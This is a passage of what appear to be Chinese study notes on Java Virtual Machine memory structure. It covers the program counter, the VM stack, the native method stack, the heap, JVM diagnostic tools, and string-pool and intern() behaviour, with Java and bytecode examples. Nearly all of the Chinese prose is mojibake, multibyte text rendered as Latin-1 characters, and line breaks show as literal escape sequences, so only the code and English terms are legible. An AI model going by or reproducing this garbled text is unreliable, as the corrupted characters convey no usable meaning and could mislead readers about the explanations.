é‡‡ç”¨çš„æ˜¯é‡é‡çº§çš„è™šæ‹Ÿæœºï¼Œå¯¹ç¨‹åºé‡‡ç”¨äº†æ›´å¤šçš„ä¼˜åŒ–ï¼›Client æ¨¡å¼å¯åŠ¨çš„ JVM é‡‡ç”¨çš„æ˜¯è½»é‡çº§çš„è™šæ‹Ÿæœº\n\n- **æ­»äº¡**ï¼š\n\n  - å½“ç¨‹åºä¸­çš„ç”¨æˆ·çº¿ç¨‹éƒ½ä¸­æ­¢ï¼ŒJVM æ‰ä¼šé€€å‡º\n  - ç¨‹åºæ­£å¸¸æ‰§è¡Œç»“æŸã€ç¨‹åºå¼‚å¸¸æˆ–é”™è¯¯è€Œå¼‚å¸¸ç»ˆæ­¢ã€æ“ä½œç³»ç»Ÿé”™è¯¯å¯¼è‡´ç»ˆæ­¢\n  - çº¿ç¨‹è°ƒç”¨ Runtime ç±» halt æ–¹æ³•æˆ– System ç±» exit æ–¹æ³•ï¼Œå¹¶ä¸” Java å®‰å…¨ç®¡ç†å™¨å…è®¸è¿™æ¬¡ exit æˆ– halt æ“ä½œ\n\n# â‘¡å†…å­˜ç»“æ„\n\n## â¶JVMå†…å­˜\n\n### 0.å†…å­˜æ¦‚è¿°\n\n**å†…å­˜ç»“æ„**æ˜¯ JVM ä¸­éå¸¸é‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯éå¸¸é‡è¦çš„ç³»ç»Ÿèµ„æºï¼Œæ˜¯ç¡¬ç›˜å’Œ CPU çš„æ¡¥æ¢ï¼Œæ‰¿è½½ç€æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„å®æ—¶è¿è¡Œï¼Œåˆå«**è¿è¡Œæ—¶æ•°æ®åŒº**ã€‚\n\nJVM å†…å­˜ç»“æ„è§„å®šäº† Java åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å†…å­˜ç”³è¯·ã€åˆ†é…ã€ç®¡ç†çš„ç­–ç•¥ï¼Œä¿è¯äº† JVM çš„é«˜æ•ˆç¨³å®šè¿è¡Œ\n\n* Java1.8 ä»¥å‰çš„å†…å­˜ç»“æ„å›¾ï¼š\n\n\n![](https://img.jwt1399.top/img/202212051655611.png)\n\n* Java1.8 ä¹‹åçš„å†…å­˜ç»“æœå›¾ï¼š\n\n![](https://img.jwt1399.top/img/202212042053847.png)\n\n### 1.ç¨‹åºè®¡æ•°å™¨\n\n> Program Counter Register ç¨‹åºè®¡æ•°å™¨ï¼ˆå¯„å­˜å™¨ï¼‰\n\nä½œç”¨ï¼šå†…éƒ¨ä¿å­˜å­—èŠ‚ç çš„è¡Œå·ï¼Œç”¨äºè®°å½•æ­£åœ¨æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤åœ°å€ï¼ˆå¦‚æœæ­£åœ¨æ‰§è¡Œçš„æ˜¯æœ¬åœ°æ–¹æ³•åˆ™ä¸ºç©ºï¼‰\n\nåŸç†ï¼š\n\n* JVM å¯¹äºå¤šçº¿ç¨‹æ˜¯é€šè¿‡çº¿ç¨‹è½®æµåˆ‡æ¢å¹¶ä¸”åˆ†é…çº¿ç¨‹æ‰§è¡Œæ—¶é—´ï¼Œä¸€ä¸ªå¤„ç†å™¨åªä¼šå¤„ç†æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹\n* åˆ‡æ¢çº¿ç¨‹éœ€è¦ä»ç¨‹åºè®¡æ•°å™¨ä¸­æ¥å›åˆ‡æ¢åˆ°å½“å‰çš„çº¿ç¨‹ä¸Šä¸€æ¬¡æ‰§è¡Œçš„è¡Œå·\n\nç‰¹ç‚¹ï¼š\n\n* æ˜¯çº¿ç¨‹ç§æœ‰çš„\n* **ä¸ä¼šå­˜åœ¨å†…å­˜æº¢å‡º**ï¼Œæ˜¯ JVM è§„èŒƒä¸­å”¯ä¸€ä¸€ä¸ªä¸å‡ºç° OOM çš„åŒºåŸŸï¼Œæ‰€ä»¥è¿™ä¸ªç©ºé—´ä¸ä¼šè¿›è¡Œ GC\n\n![](https://img.jwt1399.top/img/202212051416292.png)\n\n### 2.è™šæ‹Ÿæœºæ ˆ\n\n> Java è™šæ‹Ÿæœºæ ˆï¼šJava Virtual Machine Stacksï¼Œ**æ¯ä¸ªçº¿ç¨‹**è¿è¡Œæ—¶æ‰€éœ€è¦çš„**å†…å­˜**\n>\n> å¼‚å¸¸ï¼š`java.lang.StackOverflowError`\n\n![](https://img.jwt1399.top/img/202212042241637.png)\n\n* æ¯ä¸ªæ–¹æ³•è¢«æ‰§è¡Œæ—¶ï¼Œéƒ½ä¼šåœ¨è™šæ‹Ÿæœºæ ˆä¸­åˆ›å»ºä¸€ä¸ªæ ˆå¸§ stack frameï¼ˆ**ä¸€ä¸ªæ–¹æ³•ä¸€ä¸ªæ ˆå¸§**ï¼‰\n\n* Java è™šæ‹Ÿæœºè§„èŒƒå…è®¸ **Java æ ˆçš„å¤§å°æ˜¯åŠ¨æ€çš„æˆ–è€…æ˜¯å›ºå®šä¸å˜çš„**\n\n* è™šæ‹Ÿæœºæ ˆæ˜¯**æ¯ä¸ªçº¿ç¨‹ç§æœ‰çš„**ï¼Œæ¯ä¸ªçº¿ç¨‹åªèƒ½æœ‰ä¸€ä¸ªæ´»åŠ¨æ ˆå¸§ï¼Œå¯¹åº”æ–¹æ³•è°ƒç”¨åˆ°æ‰§è¡Œå®Œæˆçš„æ•´ä¸ªè¿‡ç¨‹\n\n* **æ¯ä¸ªæ ˆç”±å¤šä¸ªæ ˆå¸§ï¼ˆFrameï¼‰ç»„æˆ**ï¼Œå¯¹åº”ç€æ¯æ¬¡æ–¹æ³•è°ƒç”¨æ—¶æ‰€å ç”¨çš„å†…å­˜ï¼Œæ¯ä¸ªæ ˆå¸§ä¸­å­˜å‚¨ç€ï¼š\n  * å±€éƒ¨å˜é‡è¡¨ï¼šå­˜å‚¨æ–¹æ³•é‡Œçš„ Java åŸºæœ¬æ•°æ®ç±»å‹ä»¥åŠå¯¹è±¡çš„å¼•ç”¨\n  * åŠ¨æ€é“¾æ¥ï¼šä¹Ÿå«æŒ‡å‘è¿è¡Œæ—¶å¸¸é‡æ± çš„æ–¹æ³•å¼•ç”¨\n  * æ–¹æ³•è¿”å›åœ°å€ï¼šæ–¹æ³•æ­£å¸¸é€€å‡ºæˆ–è€…å¼‚å¸¸é€€å‡ºçš„å®šä¹‰\n  * æ“ä½œæ•°æ ˆæˆ–è¡¨è¾¾å¼æ ˆå’Œå…¶ä»–ä¸€äº›é™„åŠ ä¿¡æ¯\n\nè®¾ç½®æ ˆå†…å­˜å¤§å°ï¼š`-Xss size`   `-Xss 1024k`ï¼ˆåœ¨ VM options ä¸­è®¾ç½®ï¼‰\n\n* åœ¨ JDK 1.4 ä¸­é»˜è®¤ä¸º 256Kï¼Œè€Œåœ¨ JDK 1.5+ é»˜è®¤ä¸º 1M\n\nè™šæ‹Ÿæœºæ ˆç‰¹ç‚¹ï¼š\n\n* æ ˆå†…å­˜**ä¸éœ€è¦è¿›è¡ŒGC**ï¼Œæ–¹æ³•å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šè¿›æ ˆï¼Œæ–¹æ³•è°ƒç”¨åè‡ªåŠ¨å¼¹æ ˆï¼Œç›¸å½“äºæ¸…ç©ºäº†æ•°æ®\n\n* æ ˆå†…å­˜åˆ†é…è¶Šå¤§ï¼Œå¯ç”¨çš„çº¿ç¨‹æ•°è¶Šå°‘ï¼ˆå†…å­˜è¶Šå¤§ï¼Œæ¯ä¸ªçº¿ç¨‹æ‹¥æœ‰çš„å†…å­˜è¶Šå¤§ï¼‰\n\n* æ–¹æ³•å†…çš„å±€éƒ¨å˜é‡æ˜¯å¦**çº¿ç¨‹å®‰å…¨**ï¼š\n  * å¦‚æœæ–¹æ³•å†…å±€éƒ¨å˜é‡æ²¡æœ‰é€ƒç¦»æ–¹æ³•çš„ä½œç”¨è®¿é—®ï¼Œå®ƒæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ˆé€ƒé€¸åˆ†æï¼‰\n  * å¦‚æœæ˜¯å±€éƒ¨å˜é‡å¼•ç”¨äº†å¯¹è±¡ï¼Œå¹¶é€ƒç¦»æ–¹æ³•çš„ä½œç”¨èŒƒå›´ï¼Œéœ€è¦è€ƒè™‘çº¿ç¨‹å®‰å…¨\n\nå¼‚å¸¸ï¼š\n\n* æ ˆå¸§è¿‡å¤šå¯¼è‡´æ ˆå†…å­˜æº¢å‡º ï¼ˆè¶…è¿‡äº†æ ˆçš„å®¹é‡ï¼‰ï¼Œä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸\n* å½“çº¿ç¨‹è¯·æ±‚çš„æ ˆæ·±åº¦è¶…è¿‡è™šæ‹Ÿæœºå…è®¸çš„æœ€å¤§æ·±åº¦æ—¶ï¼Œä¼šæŠ›å‡º StackOverflowError å¼‚å¸¸\n\nçº¿ç¨‹è¿è¡Œè¯Šæ–­ï¼š\n\n* å®šä½ï¼š\n  * jps å®šä½è¿›ç¨‹ ID\n  * topå®šä½å“ªä¸ªè¿›ç¨‹å¯¹cpuçš„å ç”¨è¿‡é«˜\n  * ps  -eo pid,%cpu | grep è¿›ç¨‹id ï¼ˆç”¨pså‘½ä»¤è¿›ä¸€æ­¥å®šä½æ˜¯å“ªä¸ªçº¿ç¨‹å¼•èµ·çš„cpuå ç”¨è¿‡é«˜ï¼‰\n* jstack è¿›ç¨‹ IDï¼šç”¨äºæ‰“å°å‡ºç»™å®šçš„ Java è¿›ç¨‹ ID æˆ– core file æˆ–è¿œç¨‹è°ƒè¯•æœåŠ¡çš„ Java å †æ ˆä¿¡æ¯\n\n### 3.æœ¬åœ°æ–¹æ³•æ ˆ\n\n> æœ¬åœ°æ–¹æ³•æ ˆï¼šNative Method Stacksï¼Œ ä¸ºè™šæ‹Ÿæœºæ‰§è¡Œæœ¬åœ°æ–¹æ³•ï¼ˆnativeæ–¹æ³•ï¼‰æ—¶æä¾›æœåŠ¡çš„\n\n- æœ¬åœ°æ–¹æ³•ä¸€èˆ¬æ˜¯ç”±å…¶ä»–è¯­è¨€ç¼–å†™ï¼ˆC/C++ï¼‰ï¼Œå¹¶ä¸”è¢«ç¼–è¯‘ä¸ºåŸºäºæœ¬æœºç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„ç¨‹åº\n- ä¸è™šæ‹Ÿæœºæ ˆç±»ä¼¼ï¼Œä¸éœ€è¦è¿›è¡Œ GCï¼Œä¹Ÿæ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼Œæœ‰ StackOverFlowError å’Œ OutOfMemoryError å¼‚å¸¸\n- æœ¬åœ°æ–¹æ³•ç”¨ `native` å…³é”®å­—ä¿®é¥°ï¼Œä¾‹å¦‚ï¼šObjectç±»ä¸­çš„wait()ã€clone()ã€hashCodeç­‰\n\n```java\npublic final native void wait();\npublic native int hashCode();\nprotected native Object clone();\n```\n\nå½“æŸä¸ªçº¿ç¨‹è°ƒç”¨ä¸€ä¸ªæœ¬åœ°æ–¹æ³•æ—¶ï¼Œå°±è¿›å…¥äº†ä¸å†å—è™šæ‹Ÿæœºé™åˆ¶çš„ä¸–ç•Œï¼Œå’Œè™šæ‹Ÿæœºæ‹¥æœ‰åŒæ ·çš„æƒé™\n\n* æœ¬åœ°æ–¹æ³•å¯ä»¥é€šè¿‡æœ¬åœ°æ–¹æ³•æ¥å£ï¼ˆJNIï¼šJava Native Interfaceï¼‰æ¥**è®¿é—®è™šæ‹Ÿæœºå†…éƒ¨çš„è¿è¡Œæ—¶æ•°æ®åŒº**\n* ç›´æ¥ä»æœ¬åœ°å†…å­˜çš„å †ä¸­åˆ†é…ä»»æ„æ•°é‡çš„å†…å­˜\n* å¯ä»¥ç›´æ¥ä½¿ç”¨æœ¬åœ°å¤„ç†å™¨ä¸­çš„å¯„å­˜å™¨\n\n### 4.å †\n\n#### å †æ¦‚è¿°\n\n> å †ï¼šHeap ï¼Œæ˜¯ JVM å†…å­˜ä¸­æœ€å¤§çš„ä¸€å—ï¼Œç”±æ‰€æœ‰**çº¿ç¨‹å…±äº«**ï¼Œç”±**åƒåœ¾å›æ”¶å™¨**ç®¡ç†çš„ä¸»è¦åŒºåŸŸï¼Œå †ä¸­å¯¹è±¡å¤§éƒ¨åˆ†éƒ½éœ€è¦è€ƒè™‘**çº¿ç¨‹å®‰å…¨**çš„é—®é¢˜\n>\n> å¼‚å¸¸ï¼šjava.lang.OutOfMemoryErrorï¼šjava heap space\n\n![](https://img.jwt1399.top/img/202212051449758.png)\n\nå­˜æ”¾å“ªäº›èµ„æºï¼š\n\n* **å¯¹è±¡å®ä¾‹**ï¼šnew åˆ›å»ºçš„å¯¹è±¡ï¼Œç±»åˆå§‹åŒ–ç”Ÿæˆçš„å¯¹è±¡ï¼Œ**åŸºæœ¬æ•°æ®ç±»å‹çš„æ•°ç»„ä¹Ÿæ˜¯å¯¹è±¡å®ä¾‹**(new åˆ›å»º)\n* **å­—ç¬¦ä¸²å¸¸é‡æ± ** StringTable/String Poolï¼š JVM ä¸ºäº†æå‡æ€§èƒ½å’Œå‡å°‘å†…å­˜æ¶ˆè€—é’ˆå¯¹å­—ç¬¦ä¸²ï¼ˆString ç±»ï¼‰ä¸“é—¨å¼€è¾Ÿçš„ä¸€å—åŒºåŸŸï¼Œä¸»è¦ç›®çš„æ˜¯ä¸ºäº†é¿å…å­—ç¬¦ä¸²çš„é‡å¤åˆ›å»ºã€‚\n  * å­—ç¬¦ä¸²å¸¸é‡æ± åŸæœ¬å­˜æ”¾äºæ–¹æ³•åŒºï¼ŒJDK7 å¼€å§‹æ”¾ç½®äºå †ä¸­\n  * å­—ç¬¦ä¸²å¸¸é‡æ± **å­˜å‚¨çš„æ˜¯ String å¯¹è±¡çš„ç›´æ¥å¼•ç”¨æˆ–è€…å¯¹è±¡**ï¼Œæ˜¯ä¸€å¼  **stringTable**\n* **é™æ€å˜é‡**ï¼šé™æ€å˜é‡æ˜¯æœ‰ static ä¿®é¥°çš„å˜é‡ï¼ŒJDK8 æ—¶ä»æ–¹æ³•åŒºè¿ç§»è‡³å †ä¸­\n* **çº¿ç¨‹åˆ†é…ç¼“å†²åŒº** Thread Local Allocation Bufferï¼šçº¿ç¨‹ç§æœ‰ä½†ä¸å½±å“å †çš„å…±æ€§ï¼Œå¯ä»¥æå‡å¯¹è±¡åˆ†é…çš„æ•ˆç‡\n\nå†…å­˜æº¢å‡ºï¼šnew å‡ºå¯¹è±¡ï¼Œå¾ªç¯æ·»åŠ å­—ç¬¦æ•°æ®ï¼Œå½“å †ä¸­æ²¡æœ‰å†…å­˜ç©ºé—´å¯åˆ†é…ç»™å®ä¾‹ï¼Œä¹Ÿæ— æ³•å†æ‰©å±•æ—¶ï¼Œå°±ä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸\n\nè®¾ç½®å †å†…å­˜æŒ‡ä»¤ï¼š`-Xmx Size`\n\n```java\n/**\n * æ¼”ç¤ºå †å†…å­˜æº¢å‡º java.lang.OutOfMemoryError: Java heap space\n * -Xmx8m\n */\npublic class Demo1_5 {\n    public static void main(String[] args) {\n        int i = 0;\n        try {\n            List<String> list = new ArrayList<>();\n            String a = \"hello\";\n            while (true) {\n                list.add(a); // hello, hellohello, hellohellohellohello ...\n                a = a + a;  // hellohellohellohello\n                i++;\n            }\n        } catch (Throwable e) {\n            e.printStackTrace();\n            System.out.println(i);\n        }\n    }\n}\n```\n\n#### å †å†…å­˜è¯Šæ–­å·¥å…·\n\n1. jpsï¼šæŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸­æœ‰å“ªäº› Java è¿›ç¨‹\n2. jmapï¼šæŸ¥çœ‹æŸä¸€æ—¶åˆ»å †å†…å­˜å ç”¨æƒ…å†µ  `jhsdb jmap --heap --pid è¿›ç¨‹id`\n3. jconsoleï¼šå›¾å½¢ç•Œé¢çš„ï¼Œå¤šåŠŸèƒ½çš„ç›‘æµ‹å·¥å…·ï¼Œå¯ä»¥è¿ç»­ç›‘æµ‹\n4. jvisualvmï¼šå›¾å½¢ç•Œé¢çš„ï¼Œå¤šåŠŸèƒ½çš„ç›‘æµ‹å·¥å…·ï¼Œå¯ä»¥è¿ç»­ç›‘æµ‹\n\n#### Java7/8å †å˜åŒ–\n\n<img src=\"https://img.jwt1399.top/img/202212051751417.png\" style=\"zoom:50%;\" />\n\nåœ¨ Java7 ä¸­å †å†…ä¼šå­˜åœ¨**å¹´è½»ä»£ã€è€å¹´ä»£å’Œæ–¹æ³•åŒºï¼ˆæ°¸ä¹…ä»£ï¼‰**ï¼ŒJava8 æ°¸ä¹…ä»£è¢«**å…ƒç©ºé—´**ä»£æ›¿äº†\n\n* Young åŒºè¢«åˆ’åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼ŒEden åŒºå’Œä¸¤ä¸ªå¤§å°ä¸¥æ ¼ç›¸åŒçš„ Survivor åŒºã€‚Survivor åŒºæŸä¸€æ—¶åˆ»åªæœ‰å…¶ä¸­ä¸€ä¸ªæ˜¯è¢«ä½¿ç”¨çš„ï¼Œå¦å¤–ä¸€ä¸ªç•™åšåƒåœ¾å›æ”¶æ—¶å¤åˆ¶å¯¹è±¡ã€‚åœ¨ Eden åŒºå˜æ»¡çš„æ—¶å€™ï¼ŒGC å°±ä¼šå°†å­˜æ´»çš„å¯¹è±¡ç§»åˆ°ç©ºé—²çš„ Survivor åŒºé—´ä¸­ï¼Œæ ¹æ® JVM çš„ç­–ç•¥ï¼Œåœ¨ç»è¿‡å‡ æ¬¡åƒåœ¾å›æ”¶åï¼Œä»ç„¶å­˜æ´»äº Survivor çš„å¯¹è±¡å°†è¢«ç§»åŠ¨åˆ° Tenured åŒºé—´\n* Old åŒºä¸»è¦ä¿å­˜ç”Ÿå‘½å‘¨æœŸé•¿çš„å¯¹è±¡ï¼Œä¸€èˆ¬æ˜¯ä¸€äº›è€çš„å¯¹è±¡ï¼Œå½“ä¸€äº›å¯¹è±¡åœ¨ Young å¤åˆ¶è½¬ç§»ä¸€å®šçš„æ¬¡æ•°ä»¥åï¼Œå¯¹è±¡å°±ä¼šè¢«è½¬ç§»åˆ° Tenured åŒº\n* Perm ä»£ä¸»è¦ä¿å­˜ Classã€ClassLoaderã€é™æ€å˜é‡ã€å¸¸é‡ã€ç¼–è¯‘åçš„ä»£ç ï¼Œåœ¨ Java7 ä¸­å †å†…æ–¹æ³•åŒºä¼šå—åˆ° GC çš„ç®¡ç†\n\nåˆ†ä»£åŸå› ï¼šä¸åŒå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸä¸åŒï¼Œ70%-99% çš„å¯¹è±¡éƒ½æ˜¯ä¸´æ—¶å¯¹è±¡ï¼Œä¼˜åŒ– GC æ€§èƒ½\n\n```java\npublic static void main(String[] args) {\n    // è¿”å›Javaè™šæ‹Ÿæœºä¸­çš„å †å†…å­˜æ€»é‡\n    long initialMemory = Runtime.getRuntime().totalMemory() / 1024 / 1024;\n    // è¿”å›Javaè™šæ‹Ÿæœºä½¿ç”¨çš„æœ€å¤§å †å†…å­˜é‡\n    long maxMemory = Runtime.getRuntime().maxMemory() / 1024 / 1024;\n    \n    System.out.println(\"-Xms : \" + initialMemory + \"M\");//-Xms : 245M\n    System.out.println(\"-Xmx : \" + maxMemory + \"M\");//-Xmx : 3641M\n}\n```\n\n#### StringTable/String Pool\n\n> å­—ç¬¦ä¸²å¸¸é‡æ± ï¼ˆString Pool / StringTable / ä¸²æ± ï¼‰å­˜å‚¨çš„æ˜¯ String å¯¹è±¡çš„ç›´æ¥å¼•ç”¨æˆ–è€…å¯¹è±¡ï¼Œå³ä¿å­˜ç€æ‰€æœ‰å­—ç¬¦ä¸²å­—é¢é‡ï¼ˆliteral stringsï¼‰ï¼Œè¿™äº›å­—é¢é‡åœ¨ç¼–è¯‘æ—¶æœŸå°±ç¡®å®šï¼Œå­—ç¬¦ä¸²å¸¸é‡æ± ç±»ä¼¼äº Java ç³»ç»Ÿçº§åˆ«æä¾›çš„**ç¼“å­˜**ï¼Œå­˜æ”¾å¯¹è±¡å’Œå¼•ç”¨\n>\n> StringTableï¼Œç±»ä¼¼ HashTable ç»“æ„ï¼Œé€šè¿‡ `-XX:StringTableSize` è®¾ç½®å¤§å°ï¼ŒJDK 1.8 ä¸­é»˜è®¤ 60013\n\n##### å­—ç¬¦ä¸²æ‹¼æ¥\n\n- å¸¸é‡æ± ä¸­çš„å­—ç¬¦ä¸²ä»…æ˜¯ç¬¦å·ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶æ‰å˜ä¸ºå¯¹è±¡(åŠ å…¥åˆ°è¿è¡Œæ—¶å¸¸é‡æ± ),å¯ä»¥é¿å…é‡å¤åˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡\n\n```java\n// å­—ç¬¦ä¸²å¸¸é‡æ± (StringTable): [ \"a\", \"b\" ,\"ab\" ]  hashtable ç»“æ„ï¼Œä¸èƒ½æ‰©å®¹\npublic static void main(String[] args) {\n  String s1 = \"a\"; // æ‡’æƒ°çš„\n  String s2 = \"b\";\n  String s3 = \"ab\";\n}\n```\n\nå­—èŠ‚ç ï¼šJava åç¼–è¯‘æŒ‡ä»¤`javap -v æ–‡ä»¶å.class`\n\n```java\n//å¸¸é‡æ± \n// å¸¸é‡æ± ä¸­çš„ä¿¡æ¯ï¼Œéƒ½ä¼šè¢«åŠ è½½åˆ°è¿è¡Œæ—¶å¸¸é‡æ± ä¸­ï¼Œ \n// è¿™æ—¶ a b ab éƒ½æ˜¯å¸¸é‡æ± ä¸­çš„ç¬¦å·ï¼Œè¿˜æ²¡æœ‰å˜ä¸º java å­—ç¬¦ä¸²å¯¹è±¡ï¼Œæ˜¯æ‡’æƒ°çš„\nConstant pool: \n   #1 = Methodref          #12.#36        // java/lang/Object.\"<init>\":()V\n   #2 = String             #37            // a\n   #3 = String             #38            // b\n   #4 = String             #39            // ab\n\n\n//è¿è¡Œä»£ç        \n 0: ldc           #2                  // String a\n 2: astore_1 //å­˜å…¥å±€éƒ¨å˜é‡è¡¨slot 1å·ä½\n 3: ldc           #3                  // String b\n 5: astore_2\n 6: ldc           #4                  // String ab\n 8: astore_3\n   \n// ldc #2 ä¼šæŠŠ a ç¬¦å·å˜ä¸º \"a\" å­—ç¬¦ä¸²å¯¹è±¡ï¼ŒStringTable: [\"a\"] \n// ldc #3 ä¼šæŠŠ b ç¬¦å·å˜ä¸º \"b\" å­—ç¬¦ä¸²å¯¹è±¡ï¼ŒStringTable: [\"a\", \"b\"] \n// ldc #4 ä¼šæŠŠ ab ç¬¦å·å˜ä¸º \"ab\" å­—ç¬¦ä¸²å¯¹è±¡ï¼ŒStringTable: [\"a\", \"b\" ,\"ab\"]    \n   \n       \n//å±€éƒ¨å˜é‡è¡¨(æ ˆ)  \nLocalVariableTable:  \n        Start  Length  Slot  Name   Signature\n            0      51     0  args   [Ljava/lang/String;\n            3      48     1    s1   Ljava/lang/String;\n            6      45     2    s2   Ljava/lang/String;\n            9      42     3    s3   Ljava/lang/String;\n```\n\n* å­—ç¬¦ä¸²**å˜é‡**çš„æ‹¼æ¥çš„åŸç†æ˜¯ StringBuilder#appendï¼Œappend æ–¹æ³•æ¯”å­—ç¬¦ä¸²æ‹¼æ¥æ•ˆç‡é«˜ï¼ˆJDK 1.8ï¼‰\n* å­—ç¬¦ä¸²**å¸¸é‡**æ‹¼æ¥çš„åŸç†æ˜¯ç¼–è¯‘æœŸä¼˜åŒ–ï¼Œæ‹¼æ¥ç»“æœæ”¾å…¥å¸¸é‡æ± \n\n```java\n// å­—ç¬¦ä¸²å¸¸é‡æ± (StringTable): [ \"a\", \"b\" ,\"ab\" ]  hashtable ç»“æ„ï¼Œä¸èƒ½æ‰©å®¹\npublic static void main(String[] args) {\n  String s1 = \"a\"; // æ‡’æƒ°çš„\n  String s2 = \"b\";\n  String s3 = \"ab\";\n  // new StringBuilder().append(\"a\").append(\"b\").toString() -->  new String(\"ab\")  å †ä¸­\n  String s4 = s1 + s2;   //å­—ç¬¦ä¸²å˜é‡   // è¿”å›çš„æ˜¯å †å†…åœ°å€\n  // javac åœ¨ç¼–è¯‘æœŸé—´çš„ä¼˜åŒ–ï¼Œç»“æœå·²ç»åœ¨ç¼–è¯‘æœŸç¡®å®šä¸ºab\n  String s5 = \"a\" + \"b\"; //å­—ç¬¦ä¸²å¸¸é‡\n  \n  System.out.println(s3 == s4); // F\n  System.out.println(s3 == s5); // T\n}\n```\n\n##### intern()\n\nJDK 1.8ï¼šå°†è¿™ä¸ªå­—ç¬¦ä¸²å¯¹è±¡å°è¯•æ”¾å…¥ä¸²æ± ï¼Œå¦‚æœ String Pool ä¸­ï¼š\n\n* å­˜åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²å’Œè¯¥å­—ç¬¦ä¸²å€¼ç›¸ç­‰ï¼Œå°±ä¼šè¿”å› String Pool ä¸­å­—ç¬¦ä¸²çš„å¼•ç”¨ï¼ˆéœ€è¦å˜é‡æ¥æ”¶ï¼‰\n* ä¸å­˜åœ¨ï¼Œä¼šæŠŠå¯¹è±¡çš„**å¼•ç”¨åœ°å€**å¤åˆ¶ä¸€ä»½æ”¾å…¥ä¸²æ± ï¼Œå¹¶è¿”å›ä¸²æ± ä¸­çš„å¼•ç”¨åœ°å€ï¼Œå‰ææ˜¯å †å†…å­˜æœ‰è¯¥å¯¹è±¡ï¼Œå› ä¸º Pool åœ¨å †ä¸­ï¼Œä¸ºäº†èŠ‚çœå†…å­˜ä¸å†åˆ›å»ºæ–°å¯¹è±¡\n\nJDK 1.6ï¼šå°†è¿™ä¸ªå­—ç¬¦ä¸²å¯¹è±¡å°è¯•æ”¾å…¥ä¸²æ± ï¼Œå¦‚æœ String Pool ä¸­ï¼š\n\n- å¦‚æœæœ‰å°±ä¸æ”¾å…¥ï¼Œè¿”å›å·²æœ‰çš„ä¸²æ± ä¸­çš„å¯¹è±¡çš„å¼•ç”¨ï¼›\n- å¦‚æœæ²¡æœ‰ä¼šæŠŠæ­¤å¯¹è±¡å¤åˆ¶ä¸€ä»½ï¼Œæ”¾å…¥ä¸²æ± ï¼ŒæŠŠä¸²æ± ä¸­çš„å¯¹è±¡è¿”å›\n\n```java\n// StringTable: [\"ab\", \"a\", \"b\"]\npublic static void main(String[] args) {\n\n  String x = \"ab\"; // StringTable: [\"ab\"]\n  \n  // å †  new String(\"a\")   new String(\"b\")  new StringBuilder()  new String(\"ab\")\n  // StringTable: [\"ab\", \"a\", \"b\"]\n  String s = new String(\"a\") + new String(\"b\");   // såªå­˜åœ¨å †ä¸­ï¼Œä¸å­˜åœ¨StringTable\n\n  // å°†è¿™ä¸ªå­—ç¬¦ä¸²å¯¹è±¡å°è¯•æ”¾å…¥ä¸²æ± ï¼Œå¦‚æœæœ‰åˆ™å¹¶ä¸ä¼šæ”¾å…¥ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ”¾å…¥ä¸²æ± ï¼Œ ä¼šæŠŠä¸²æ± ä¸­çš„å¯¹è±¡è¿”å›\n  String s2 = s.intern(); \n\n  System.out.println(s == x);  // F\n  System.out.println(s2 == x); // T\n  \n}\n```\n\n- == æ¯”è¾ƒåŸºæœ¬æ•°æ®ç±»å‹ï¼šæ¯”è¾ƒçš„æ˜¯å…·ä½“çš„å€¼\n- == æ¯”è¾ƒå¼•ç”¨æ•°æ®ç±»å‹ï¼šæ¯”è¾ƒçš„æ˜¯å¯¹è±¡åœ°å€å€¼\n\nç»“è®ºï¼š\n\n```java\nString s1 = \"ab\";\t\t\t\t\t\t\t\t// abä»…æ”¾å…¥ä¸²æ±   StringTable: [\"ab\"]\n\nString s2 = new String(\"a\") + new String(\"b\");\t// abä»…æ”¾å…¥å †  StringTable: [\"a\",\"b\"]\n\nString s = new String(\"ab\"); // abä¸²æ± å’Œå †éƒ½å­˜åœ¨ StringTable: [\"ab\"]\n```\n\n****\n\n##### å¸¸è§é—®é¢˜\n\né—®é¢˜ä¸€ï¼š\n\n```java\npublic static void main(String[] args) {\n    String s = new String(\"a\") + new String(\"b\");//new String(\"ab\")\n    //åœ¨ä¸Šä¸€è¡Œä»£ç æ‰§è¡Œå®Œä»¥åï¼Œå­—ç¬¦ä¸²å¸¸é‡æ± ä¸­å¹¶æ²¡æœ‰\"ab\"\n\n    String s2 = s.intern();\n    //jdk6ï¼šä¸²æ± ä¸­åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²\"ab\"ï¼ŒæŠŠæ­¤å¯¹è±¡å¤åˆ¶ä¸€ä»½\n    //jdk8ï¼šä¸²æ± ä¸­æ²¡æœ‰åˆ›å»ºå­—ç¬¦ä¸²\"ab\",è€Œæ˜¯åˆ›å»ºä¸€ä¸ªå¼•ç”¨æŒ‡å‘ new String(\"ab\")ï¼Œå°†æ­¤å¼•ç”¨è¿”å›\n\n    System.out.println(s2 == \"ab\");//jdk6:true  jdk8:true\n    System.out.println(s == \"ab\");//jdk6:false  jdk8:true\n}\n```\n\né—®é¢˜äºŒï¼š\n\n```java\npublic static void main(String[] args) {\n    String str1 = new StringBuilder(\"58\").append(\"tongcheng\").toString();\n    System.out.println(str1 == str1.intern());//trueï¼Œå­—ç¬¦ä¸²æ± ä¸­ä¸å­˜åœ¨ï¼ŒæŠŠå †ä¸­çš„å¼•ç”¨å¤åˆ¶ä¸€ä»½æ”¾å…¥ä¸²æ± \n\n    String str2 = new StringBuilder(\"ja\").append(\"va\").toString();\n    System.out.println(str2 == str2.intern());//falseï¼Œå­—ç¬¦ä¸²æ± ä¸­å­˜åœ¨ï¼Œç›´æ¥è¿”å›å·²ç»å­˜åœ¨çš„å¼•ç”¨\n}\n```\n\nåŸå› ï¼š\n\n* System 